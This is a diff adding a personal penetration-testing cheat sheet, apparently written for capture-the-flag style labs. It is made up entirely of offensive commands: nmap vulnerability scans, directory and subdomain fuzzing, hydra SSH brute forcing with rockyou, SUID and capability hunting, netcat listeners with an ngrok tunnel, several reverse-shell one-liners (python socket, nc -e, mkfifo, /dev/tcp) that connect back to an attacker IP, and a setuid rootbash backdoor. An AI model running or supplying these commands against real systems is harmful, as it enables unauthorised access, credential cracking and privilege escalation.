@@ -1,0 +1,30 @@
+### 10.8.98.114 ### 10.14.32.190 ###
+
+sudo nmap -vv -T4 -Pn --script vuln $h -p 80,135,139,445,3389  ### --min-rate 2500
+showmount -e $h ### sudo mount -o rw,vers=2 10.10.10.10:/tmp /mnt/thm
+
+gobuster dir -u http://$h:80 -w ~/perso/secu/dict/wordlists/dir-vvsmall.txt -d -x php,txt,html -t 100
+wfuzz -c -w ~/perso/secu/dict/dns/sub5k.txt -u "http://$h/" -H "Host: FUZZ.$h"
+hydra -l login -P ~/perso/secu/dict/rockyou.txt $h -s 22 ssh -t 64 -I -v
+
+scp -P 22 login@$h:~/file ./
+find / -type f -perm -04000 -ls 2>/dev/null
+find / -type f -user xxx -ls 2>/dev/null
+find / -type f -iname "*user.txt*" -ls 2>/dev/null
+find / -type f -iname "*.bak" -print | xargs /bin/cat
+getcap -r / 2>/dev/null
+
+nc -lnvp 4444	//	sudo nc -lnvp 21
+~/perso/secu/tools/ngrok/ngrok tcp 4444
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.98.114",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+nc 10.14.32.190 4444 -e /bin/sh	###	nc -lnvp 8081 -e /bin/bash	### nc $h 8081
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.32.190 4444 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;nc 10.14.32.190 4444 </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f
+/bin/bash -c "bash -i >& /dev/tcp/10.14.32.190/4444 0>&1 2>&1"
+https://www.revshells.com/
+python3 -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm	### ctrl+z
+	stty -a;stty raw -echo; fg	### stty rows 31 cols 119
+https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
+
+cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash
